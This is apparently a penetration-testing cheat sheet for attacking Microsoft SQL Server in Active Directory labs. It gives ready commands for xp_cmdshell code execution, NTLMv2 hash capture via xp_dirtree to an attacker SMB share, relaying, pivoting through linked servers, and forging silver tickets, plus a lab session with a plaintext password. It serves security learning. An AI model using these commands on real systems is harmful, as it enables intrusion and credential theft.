# Microsoft SQL service (port 1433)

If the Domain controller or any other windows machine have accessible Microsoft SQL service through the standar port 1433, or any custom port accessible, you can use a domain user credentials (or local user credentials) to login. In some cases this can lead to RCE through "xp_cmdshell" function, ntlm authentication relay through "xp_dirtree" function or get the NTLM v2 hash from the user running the service, enumerate databases, arbitrary querys, and migrate to other computers if are connected through "links".

You can login into the service using mssqlclient.py from impacket suite:

`mssqlclient.py <domain>/<user>:'<password>'@<ip>`

KALI -> `impacket-mssqlclient <domain>/<user>:'<password>'@<ip>`

Pass-the-hash: `mssqlclient.py <domain>/user:@<ip> -hashes '<optional LM hash>:<NT hash>'`

Kerberos auth: `sudo rdate -n <ip> ; mssqlclient.py <domain>/<user>:@<machine>.<domain> -k -no-pass`

Windows auth: If user you use is a windows user instead of SQL server user use flag -windows-auth

<br>

### Try an RCE:

Whatever user you loged in, try to use "xp_cmdshell" command to execute a command inside that machine:

`xp_cmdshell "whoami"`

If this fails for any reason (probably) try to enable this function with:

`enable_xp_cmdshell`

`reconfigure`

`xp_cmdshell "whoami"`

NOTE: Remember that 'sa' user is more likely to be able to run xp_cmdshell in the machine

<br>

### NTLM relay / hash grabbing / file enumeration

You can also try to get ntlmv2 hash for the user which is running the server. Then you can crack offline that hash to get credentials, or (if you suspect that credentials could have admin rights against another domain machine) you can use "ntlmrelayx" tool to relay the credentials and get RCE (or whatever) to second machine.

From your attacking machine: `smbserver.py -smb2support share .` (also "responder" tool will work)

Inside mssqlclient.py session: `xp_dirtree \\<your_smbserver_ip>\whatever`. You will get the NTLMv2 hash and try to crack.

For NTLM relay look for "responder" and "ntlmrelayx" functionalitys.

Additionally you can use xp_dirtree to enumerate files inside C volume or any other share: `xp_dirtree \\localhost\C$\`

<br>

### Database enumeration:

You can also make simple direct querys to enumerate the machine, users and sql process to get information:

Get all database: `EXEC sp_databases;` or `SELECT name FROM sys.databases;` "master", "tempdb", "model", "msdb" databases are coming from default.

Use specific database: `USE <database name>;`

Get tables from current database: `SELECT name FROM sys.tables;` or `SELECT * FROM information_schema.tables;`

Get content from specific table: `SELECT * FROM <table name>;`

Get columns from specific table: `SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('<table name>');`

Enumerate users and roles: `SELECT name FROM sys.syslogins;`


Other information you can enumerate from the machine:
```
SELECT @@VERSION;               -- Sql server version
SELECT SERVERPROPERTY('MachineName');  -- Hostname
SELECT SERVERPROPERTY('Edition');      -- Edition (Express, Standard, etc.)
SELECT SERVERPROPERTY('InstanceName'); -- Instance name
SELECT SERVERPROPERTY('ProductLevel'); -- Patch level
SELECT SUSER_SID('<domain>\<user>') AS SID_Usuario; -- User SID

SELECT name,type_desc FROM sys.server_principals WHERE type='S'; -- Sql logins (server-level users and roles)
SELECT name,type_desc FROM sys.server_principals WHERE type='R'; -- server roles
SELECT name,type_desc FROM sys.server_principals WHERE type='U'; -- windows logins (windows users, domain or local)
SELECT name,type_desc FROM sys.server_principals WHERE type='G'; -- windows groups
SELECT name,type_desc FROM sys.server_principals; -- see all users (server and windows, no database)

SELECT name,type_desc,authentication_type_desc FROM sys.database_principals; -- all database users from actual DB, and roles.
SELECT permission_name, state_desc FROM sys.database_permissions WHERE grantee_principal_id = USER_ID('guest'); -- see user permisions

SELECT dp.name AS database_user FROM sys.database_principals dp LEFT JOIN sys.server_principals sp ON dp.sid=sp.sid WHERE dp.type IN ('S','U') AND sp.name IS NULL; -- orphen users (db user without login in server)

SELECT * FROM sys.dm_exec_sessions;       -- Active sessions and connections
SELECT * FROM sys.dm_exec_connections;

SELECT * FROM sys.dm_exec_requests;       -- SQL process

sp_configure "show advanced options", 1 -- Show configuration options

Detect users (or groups) with critical privileges over SQL Server:
SELECT m.name AS principal_name, m.type_desc, r.name AS server_role FROM sys.server_role_members rm JOIN sys.server_principals r ON rm.role_principal_id=r.principal_id JOIN sys.server_principals m ON rm.member_principal_id=m.principal_id WHERE m.type_desc IN ('WINDOWS_LOGIN','WINDOWS_GROUP') ORDER BY r.name;


Navigate through files:
master.sys.xp_dirtree 'c:\',1,1 -- change directory to see the files and folders.
SELECT * FROM OPENROWSET(BULK 'C:\archivo.txt', SINGLE_CLOB) a; -- see content of text file

```

<br>

### Links:

```diff
- Warning: This option might not be available if you are using an old version of imapcket.
Use v0.11 or above. In kali use command `impacket-mssqlclient`
```

When mssql service is conected to multiple machines (AD environment is a good example) you can access to this machines through mssqlclient.py. To do it just use `enum_links` option to see the "Linked servers" availables. Select any with `use_link "<name of linked server>"`. Now you are against a diferent machine, and you can try again xp_cmdshell or any step above.

Example:

```
┌──(xavi㉿kali)-[~/tools]
└─$ impacket-mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@10.10.11.89 -windows-auth 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)> enum_links


SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      

DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      

Linked Server       Local Login       Is Self Mapping   Remote Login   
-----------------   ---------------   ---------------   ------------   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc   


SQL (darkzero\john.w  guest@master)> use_link "DC02.darkzero.ext"
SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)>
```


<br>

### SPN user -> Silver ticket

If the user you compromise have an SPN associated you may create arbitrary kerberos tickets, for any user or group, for that specific service.

Users associated to SPN use to be called like:

```
<domain>\<user with name related to service>
DOMAIN.LOCAL\svc_sql
MEGACORP.HTB\svc_mssql
COMPANY.COM\sql_svc
TESTLAB.local\svc_sql_prod
SUPERDOMAIN.THM\svc_sql_inst01
```

SPN associated to that user might be like:

```
MSSQLSvc/server:port
MSSQLSvc/server.domain:port
```


If an user is associacted to an SPN you my craft arbitrary kerberos tickets (only for that service) using ticketer. You may impersonate any user or group you want. Examples:

`ticketer.py -nthash '<nt hash>' -domain-sid '<domain SID>' -domain '<domain>' -spn '<spn>' '<user or group to impersonate>'`

Kali -> `impacket-ticketer -nthash '<nt hash>' -domain-sid '<domain SID>' -domain '<domain>' -spn '<spn>' '<user or group to impersonate>'`





<br>

Other interesting articles:

https://one2bla.me/Breach-operations/attacking-mssql

https://medium.com/@Tvrpism/how-does-the-silver-ticket-actually-work-368ec8905edd

<br>

Recomended labs to practice:
- Darkzero (Hackthebox)
- Signed (Hackthebox)
- Querier (Hackthebox) https://www.youtube.com/watch?v=hfzYnjBzW_k
